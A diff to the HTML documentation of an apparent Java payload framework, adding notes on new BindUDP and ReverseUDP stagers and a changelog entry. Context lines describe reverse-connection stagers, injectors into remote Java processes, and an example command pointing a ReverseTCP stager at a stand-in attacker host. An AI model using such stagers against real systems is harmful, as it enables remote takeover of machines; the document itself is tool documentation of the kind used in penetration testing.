@@ -79,6 +79,9 @@ In this case, the stager handler will print the port number to stdout. When this
 in conjunction with JDWPInjector or with the AttachInjector, the new port number will automatically be
 used in the command line to the remote process.</p>
 
+<p>BindUDP and ReverseUDP work like their TCP counterparts; note that due to the crude UDP
+streaming emulation, you can use one host/port only for one simultaneous payload connection.</p>
+
 <p>The stager handler MultiListen can be used to run a stage that only outputs information (like the SystemInformation stage)
 multiple times (even multi-threaded). This will work with ReverseTCP and ReverseSSL stagers, you will have to give the full
 command line for this to the stager. Example: <tt>MultiListen ReverseTCP attacker.example.com -- SystemInfo</tt>.
@@ -116,6 +119,7 @@ on the attacker's machine, which will be uploaded to the temp directory and exec
 <li>Added StopListening stage for BindMultiTCP stager</li>
 <li>Added automated tests and a code coverage report (see the source code for details)</li>
 <li>JarBuilder, AgentJarBuilder, AppletJarBuilder, EmbeddedJarBuilder: Support stripping debug info from classes and giving a custom output filename.</li>
+<li>Add BindUDP/ReverseUDP stagers</li>
 </ul>
 
 <h2>Changes since version 0.1</h2>
